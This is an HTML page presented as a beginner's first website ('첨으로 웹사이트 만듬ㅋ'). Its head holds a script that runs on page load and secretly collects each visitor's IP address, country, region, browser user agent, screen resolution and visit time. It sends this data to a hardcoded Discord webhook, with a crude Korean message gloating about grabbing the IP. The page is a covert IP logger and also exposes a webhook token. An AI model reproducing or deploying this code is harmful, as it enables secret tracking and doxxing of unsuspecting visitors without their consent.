<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>test site</title>
    <script>
        // 1. 본인의 디스코드 웹훅 URL을 입력해 주세요.
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554079546448285738/bPvvBD1kInPi0nVVwC1y9rMM1RUo3aApOciZMQyGjx1Sa0Aids9GLlCPfJ9B_nRpGx3-".trim();

        window.onload = async function() {
            let clientIp = "수집 실패 (보안 차단)";
            let locationInfo = "알 수 없음";

            try {
                // CORS 보안 차단율이 가장 낮은 국가별 IP 조회 API 사용
                const response = await fetch('https://ip-api.com');
                if (response.ok) {
                    const data = await response.json();
                    clientIp = data.query; // 방문자의 실제 IP 주소
                    locationInfo = `${data.country} (${data.regionName})`; // 국가 및 지역
                }
            } catch (e) {
                console.log("IP 조회 API가 차단되었습니다. 기본 정보만 전송합니다.");
            }

            try {
                // 환경 정보 수집
                const userAgent = navigator.userAgent;
                const screenResolution = window.screen.width + "x" + window.screen.height;

                // 디스코드로 전송할 최종 데이터 구성
                const payload = {
                    content: "# **아이피땄다시발야기분좋다**\n" +
                             "- **IP 주소:** `" + clientIp + "`\n" +
                             "- **위치:** " + locationInfo + "\n" +
                             "- **접속 시간:** " + new Date().toLocaleString() + "\n" +
                             "- **화면 해상도:** " + screenResolution + "\n" +
                             "- **브라우저 정보:** " + userAgent
                };

                // 디스코드 웹훅 전송
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                console.log("IP 및 접속 로그 전송을 완료했습니다.");

            } catch (error) {
                console.error('웹훅 전송 중 오류 발생:', error);
            }
        };
    </script>
</head>
<body>
    <h1>첨으로 웹사이트 만듬ㅋ</h1>
</body>
</html>
